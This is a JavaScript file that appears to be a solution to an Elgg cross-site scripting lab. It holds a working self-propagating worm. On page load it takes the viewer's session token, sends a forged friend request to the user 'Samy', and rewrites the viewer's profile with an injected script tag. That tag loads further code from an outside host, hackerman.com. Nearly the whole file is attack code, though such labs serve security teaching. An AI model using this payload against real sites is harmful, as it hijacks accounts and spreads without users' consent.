window.onload = function(){
	var name = "&name="+elgg.session.user.name;	
	var guid="&guid="+elgg.session.user.guid;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;	
	var token="&__elgg_token="+elgg.security.token.__elgg_token;	
	var scriptcall ="<script type%3D\"text/javascript\"src%3D\"http://www.hackerman.com/summywormhack.js\"></script>";
	var description_text = "<p>Sumy is the best!</p>";

	var desc="&description="+scriptcall+description_text+"&accesslevel[description]=2&briefdescription=&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2";

	var content= token+ts+name+desc+guid; //FILL IN
	var samyGuid=47; //FILL IN

	var sendurl_edit = "http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
	var sendurl_addfriend="http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token+ts+token;
	
	if(elgg.session.user.guid!=samyGuid){
		var Ajax=null;
		var Ajax2=null;

		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl_addfriend,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
		
		Ajax2=new XMLHttpRequest();
		Ajax2.open("POST",sendurl_edit,true);
		Ajax2.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax2.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax2.send(content);
	}
}
